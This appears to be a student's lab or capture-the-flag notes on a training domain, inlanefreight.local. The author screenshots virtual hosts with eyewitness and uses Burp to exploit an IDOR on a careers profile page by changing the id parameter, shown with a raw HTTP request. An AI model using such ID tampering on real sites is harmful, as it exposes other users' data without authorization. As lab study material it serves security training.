# Notes
Using the `vhosts` file I made, started with `eyewitness`.
`eyewitness -f vhosts.txt -d subdomains-inlanefreight`
Scanning through the screenshots here are the notes so far:

### Careers.Inlanefreight.local (IDOR)
Using `burp`, going through the page I found a login/create user.
Making my own user I was able to look at the job posting of the website.
Setting my eyes on the `http://careers.inlanefreight.local/profile?id=4`, this told me the IDOR is here for `Question 1` [[3-web-enumeration-&-exploitation]]

Changing the ID is burp, was able to transverse the users and find the flag.
```html
GET /profile?id=4 HTTP/1.1
Host: careers.inlanefreight.local
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.auv4ag.eB3aBFYyQnQksKhse6VDNGwcgac
Connection: keep-alive
```
